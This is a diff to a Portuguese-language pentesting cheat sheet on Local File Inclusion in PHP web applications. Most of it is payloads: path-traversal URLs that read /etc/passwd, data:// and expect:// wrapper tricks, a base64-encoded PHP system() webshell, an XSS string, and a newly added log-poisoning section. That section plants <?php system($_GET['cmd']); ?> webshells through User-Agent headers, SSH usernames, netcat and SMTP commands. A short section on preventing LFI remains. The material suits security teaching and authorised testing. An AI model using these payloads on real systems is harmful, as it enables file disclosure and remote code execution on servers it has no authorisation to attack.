@@ -30,6 +30,7 @@ https://www.teste.com.br/arquivo.php?img=../../../../../etc/passwd%00
 https://www.teste.com.br/arquivo.php?img=.../.../.../.../.../.../etc/passwd
 https://www.teste.com.br/arquivo.php?img=..//..//..//..//..//..//etc/passwd
 https://www.teste.com.br/arquivo.php?img=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
+https://www.teste.com.br/arquivo.php?img=/var/www/html/../../../../../../etc/passwd
 ```
 
 ### Double URL Encode
@@ -59,8 +60,8 @@ https://wwww.teste.com.br/arquivo.php?img=file:///etc/passwd
 https://wwww.teste.com.br/arquivo.php?img=data://text/plain,<?php phpinfo(); ?>
 http://www.teste.com/arquivo.php?img=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
 ```
-### Curiosidade
-> É possível injetar um XSS utilizando essa técnica
+## Curiosidade
+> É possível injetar um XSS utilizando essa técnica do data://
 ```yaml
 https://wwww.teste.com.br/arquivo.php?img=data:application/x-httpd-php;base64,PHNjcmlwdD4gYWxlcnQoMSkgPC9zY3JpcHQ+  (<script> alert(1) </script>) 
 ```
@@ -70,6 +71,52 @@ https://wwww.teste.com.br/arquivo.php?img=data:application/x-httpd-php;base64,PH
 http://www.teste.com/arquivo.php?img=expect://ls
 http://www.teste.com/arquivo.php?img=expect://id
 ```
+
+
+# LFI - Log Poisoning
+
+## Log Poisoning Web Server
+> Se a aplicação web é vulnerável a LFI, é possível tentar injetar uma webshell dentro do agente de usuário(User-Agent) ou através de um parâmetro GET, e dessa forma acessando o arquivo de log atráves do LFI como "http://www.teste.com/file.php?arquivo=/var/log/apache2&cmd=ls"
+* User-Agent:
+```yaml
+GET /arquivo.php?file=/
+Host: www.teste.com
+User-Agent: <?php system($_GET['c']); ?>
+```
+* Parâmetro GET
+```yaml
+http://www.teste.com/arquivo.php?img=<?php system($_GET['cmd']); ?>
+```
+## Log Poisoning SSH
+> Através dos logs do SSH (/var/log/auth.log), é possível utilizar a técnica através de um usuário ou via netcat
+* Usuário SSH
+```yaml
+root@pop-os:/home/victor# ssh '<?php system($_GET['cmd']); ?>'@192.168.4.160
+```
+* Netcat SSH
+```yaml
+root@pop-os:/home/victor# nc -v teste.com.br 22
+Connection to teste.com.br (31.3.2.1) 22 port [tcp/ssh] succeeded!
+<?php system($_GET['c']); ?>
+``` 
+## Log Poisoning via /proc/self/environ
+> Através desse arquivo, conseguimos injetar uma web shell no User-Agent.
+```yaml
+GET /arquivo.php?file=/
+Host: www.teste.com
+User-Agent: <?php system($_GET['c']); ?>
+```
+
+## Log Poisoning SMTP
+> O arquivo de log do SMTP (/var/mail/mail.log) é possível injetar uma webshell no usuário de email
+```yaml
+nc -vn 192.168.4.160 25
+MAIL FROM: email@gmail.com
+RCPT TO: <?php system($_GET[‘cmd’]); ?>
+```
+<h5>
+Claro que existe diversas possibilidades, porém demonstrei algumas bem utilizadas no dia a dia de um pentester.</h5>
+
 
 # Como evitar um ataque de Local File Inclusion? 
 
@@ -109,5 +156,6 @@ if($_GET['page'] === "teste.php"){
 * https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 * https://github.com/swisskyrepo/PayloadsAllTheThings
 * https://portswigger.net
+* https://book.hacktricks.xyz/pentesting-web/file-inclusion
 
 <img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000ff&height=120&section=footer"/>
